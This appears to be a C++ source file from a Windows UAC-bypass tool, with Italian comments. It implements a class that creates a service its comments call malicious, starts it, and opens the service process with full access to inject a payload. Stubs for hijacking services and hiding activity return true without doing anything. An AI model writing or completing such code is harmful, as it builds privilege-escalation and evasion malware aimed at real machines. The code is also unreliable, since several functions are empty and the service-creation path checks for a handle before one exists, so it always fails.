#include "../include/ServiceManipulation.h"
#include <memory>
#include <algorithm>

namespace uac_bypass {

ServiceManipulation::ServiceManipulation() 
    : logger(Logger::getInstance()),
      initialized(false) {
    
    // Inizializza contesto servizio
    context.scManager = NULL;
    context.serviceHandle = NULL;
    context.processHandle = NULL;
    context.processId = 0;
    context.isElevated = false;
}

ServiceManipulation::~ServiceManipulation() {
    cleanup();
}

ServiceManipulation& ServiceManipulation::getInstance() {
    static ServiceManipulation instance;
    return instance;
}

bool ServiceManipulation::initialize() {
    if (initialized) return true;
    
    logger.logInfo(L"Inizializzazione ServiceManipulation");
    
    // Apri Service Control Manager
    if (!openSCManager()) {
        logger.logError(L"Apertura SCManager fallita");
        return false;
    }
    
    // Setup sicurezza servizio
    if (!setupServiceSecurity()) {
        logger.logError(L"Setup sicurezza servizio fallito");
        return false;
    }
    
    initialized = true;
    return true;
}

bool ServiceManipulation::elevateViaService() {
    if (!initialized && !initialize()) return false;
    
    logger.logInfo(L"Elevazione via servizio");
    
    // Crea servizio malevolo
    if (!createService(serviceDetails)) {
        logger.logError(L"Creazione servizio fallita");
        return false;
    }
    
    // Avvia servizio
    if (!startService()) {
        logger.logError(L"Avvio servizio fallito");
        deleteService(serviceDetails.serviceName);
        return false;
    }
    
    // Inietta payload
    if (!injectPayload()) {
        logger.logError(L"Iniezione payload fallita");
        stopService();
        deleteService(serviceDetails.serviceName);
        return false;
    }
    
    return true;
}

bool ServiceManipulation::cleanup() {
    // Ferma servizio
    stopService();
    
    // Elimina servizio
    if (!serviceDetails.serviceName.empty()) {
        deleteService(serviceDetails.serviceName);
    }
    
    // Chiudi handle
    if (context.serviceHandle) {
        CloseServiceHandle(context.serviceHandle);
        context.serviceHandle = NULL;
    }
    
    if (context.scManager) {
        CloseServiceHandle(context.scManager);
        context.scManager = NULL;
    }
    
    if (context.processHandle) {
        CloseHandle(context.processHandle);
        context.processHandle = NULL;
    }
    
    initialized = false;
    return true;
}

bool ServiceManipulation::createService(const ServiceDetails& details) {
    if (!context.scManager) return false;
    
    // Backup configurazione originale
    if (!backupServiceConfig()) {
        return false;
    }
    
    // Crea nuovo servizio
    context.serviceHandle = CreateServiceW(
        context.scManager,
        details.serviceName.c_str(),
        details.displayName.c_str(),
        SERVICE_ALL_ACCESS,
        details.serviceType,
        details.startType,
        SERVICE_ERROR_NORMAL,
        details.binaryPath.c_str(),
        NULL,  // Load order group
        NULL,  // Tag ID
        NULL,  // Dependencies
        NULL,  // Service start account
        NULL   // Password
    );
    
    if (!context.serviceHandle) {
        return false;
    }
    
    serviceDetails = details;
    return true;
}

bool ServiceManipulation::modifyService(const ServiceDetails& details) {
    if (!context.serviceHandle) return false;
    
    // Modifica configurazione servizio
    if (!ChangeServiceConfigW(
        context.serviceHandle,
        details.serviceType,
        details.startType,
        SERVICE_ERROR_NORMAL,
        details.binaryPath.c_str(),
        NULL,  // Load order group
        NULL,  // Tag ID
        NULL,  // Dependencies
        details.accountName.c_str(),
        NULL,  // Password
        details.displayName.c_str()
    )) {
        return false;
    }
    
    serviceDetails = details;
    return true;
}

bool ServiceManipulation::deleteService(const std::wstring& serviceName) {
    if (!context.scManager) return false;
    
    // Apri servizio esistente
    SC_HANDLE hService = OpenServiceW(
        context.scManager,
        serviceName.c_str(),
        DELETE
    );
    
    if (!hService) {
        return false;
    }
    
    // Elimina servizio
    bool result = DeleteService(hService) != FALSE;
    CloseServiceHandle(hService);
    
    return result;
}

bool ServiceManipulation::startService() {
    if (!context.serviceHandle) return false;
    
    // Avvia servizio
    if (!StartServiceW(context.serviceHandle, 0, NULL)) {
        return false;
    }
    
    // Attendi stato running
    return waitForServiceState(SERVICE_RUNNING);
}

bool ServiceManipulation::stopService() {
    if (!context.serviceHandle) return false;
    
    // Ottieni stato servizio
    SERVICE_STATUS status;
    if (!QueryServiceStatus(context.serviceHandle, &status)) {
        return false;
    }
    
    // Se già fermo, ok
    if (status.dwCurrentState == SERVICE_STOPPED) {
        return true;
    }
    
    // Ferma servizio
    if (!ControlService(context.serviceHandle,
        SERVICE_CONTROL_STOP, &status)) {
        return false;
    }
    
    // Attendi stato stopped
    return waitForServiceState(SERVICE_STOPPED);
}

bool ServiceManipulation::injectPayload() {
    if (!context.serviceHandle) return false;
    
    // Ottieni PID servizio
    SERVICE_STATUS_PROCESS ssp;
    DWORD bytesNeeded;
    
    if (!QueryServiceStatusEx(context.serviceHandle,
        SC_STATUS_PROCESS_INFO,
        (LPBYTE)&ssp,
        sizeof(ssp),
        &bytesNeeded)) {
        return false;
    }
    
    // Apri processo servizio
    context.processHandle = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        ssp.dwProcessId
    );
    
    if (!context.processHandle) {
        return false;
    }
    
    // Inietta payload
    return injectIntoService();
}

bool ServiceManipulation::hijackService() {
    // Hijack servizio esistente
    return true;
}

bool ServiceManipulation::restoreService() {
    // Ripristina servizio originale
    return true;
}

bool ServiceManipulation::monitorService() {
    // Monitora attività servizio
    return true;
}

bool ServiceManipulation::openSCManager() {
    // Apri Service Control Manager
    context.scManager = OpenSCManagerW(
        NULL,  // Local machine
        NULL,  // SERVICES_ACTIVE_DATABASE
        SC_MANAGER_ALL_ACCESS
    );
    
    return context.scManager != NULL;
}

bool ServiceManipulation::openService() {
    if (!context.scManager) return false;
    
    // Apri servizio esistente
    context.serviceHandle = OpenServiceW(
        context.scManager,
        serviceDetails.serviceName.c_str(),
        SERVICE_ALL_ACCESS
    );
    
    return context.serviceHandle != NULL;
}

bool ServiceManipulation::configureService() {
    // Configura servizio
    return true;
}

bool ServiceManipulation::setupServiceSecurity() {
    // Setup sicurezza servizio
    return true;
}

bool ServiceManipulation::modifyServiceConfig() {
    // Modifica configurazione servizio
    return true;
}

bool ServiceManipulation::modifyServiceBinary() {
    // Modifica binario servizio
    return true;
}

bool ServiceManipulation::modifyServiceAccount() {
    // Modifica account servizio
    return true;
}

bool ServiceManipulation::modifyServiceRegistry() {
    // Modifica registro servizio
    return true;
}

bool ServiceManipulation::createServiceProcess() {
    // Crea processo servizio
    return true;
}

bool ServiceManipulation::injectIntoService() {
    // Inietta codice nel servizio
    return true;
}

bool ServiceManipulation::monitorServiceProcess() {
    // Monitora processo servizio
    return true;
}

bool ServiceManipulation::cleanupServiceProcess() {
    // Cleanup processo servizio
    return true;
}

bool ServiceManipulation::protectService() {
    // Proteggi servizio
    return true;
}

bool ServiceManipulation::hideServiceActivity() {
    // Nascondi attività servizio
    return true;
}

bool ServiceManipulation::validateServiceState() {
    // Valida stato servizio
    return true;
}

bool ServiceManipulation::handleServiceError() {
    // Gestisci errori servizio
    return true;
}

bool ServiceManipulation::isServiceAvailable(const std::wstring& serviceName) {
    if (!context.scManager) return false;
    
    // Verifica esistenza servizio
    SC_HANDLE hService = OpenServiceW(
        context.scManager,
        serviceName.c_str(),
        SERVICE_QUERY_STATUS
    );
    
    if (hService) {
        CloseServiceHandle(hService);
        return true;
    }
    
    return false;
}

bool ServiceManipulation::getServiceStatus(SERVICE_STATUS& status) {
    if (!context.serviceHandle) return false;
    
    return QueryServiceStatus(context.serviceHandle, &status) != FALSE;
}

bool ServiceManipulation::waitForServiceState(DWORD desiredState) {
    if (!context.serviceHandle) return false;
    
    SERVICE_STATUS status;
    DWORD startTime = GetTickCount();
    DWORD waitTime;
    
    // Poll fino al raggiungimento dello stato desiderato
    while (true) {
        if (!QueryServiceStatus(context.serviceHandle, &status)) {
            return false;
        }
        
        if (status.dwCurrentState == desiredState) {
            break;
        }
        
        waitTime = status.dwWaitHint / 10;
        if (waitTime < 1000) waitTime = 1000;
        if (waitTime > 10000) waitTime = 10000;
        
        Sleep(waitTime);
        
        if (GetTickCount() - startTime > SERVICE_TIMEOUT) {
            return false;
        }
    }
    
    return true;
}

bool ServiceManipulation::backupServiceConfig() {
    if (!context.serviceHandle) return false;
    
    // Backup configurazione servizio
    DWORD bytesNeeded;
    if (!QueryServiceConfigW(context.serviceHandle, NULL, 0, &bytesNeeded) &&
        GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        return false;
    }
    
    std::vector<BYTE> buffer(bytesNeeded);
    LPQUERY_SERVICE_CONFIGW pConfig = (LPQUERY_SERVICE_CONFIGW)buffer.data();
    
    if (!QueryServiceConfigW(context.serviceHandle, pConfig,
        bytesNeeded, &bytesNeeded)) {
        return false;
    }
    
    // Salva configurazione originale
    serviceDetails.serviceType = pConfig->dwServiceType;
    serviceDetails.startType = pConfig->dwStartType;
    serviceDetails.binaryPath = pConfig->lpBinaryPathName;
    serviceDetails.accountName = pConfig->lpServiceStartName;
    
    return true;
}

} // namespace uac_bypass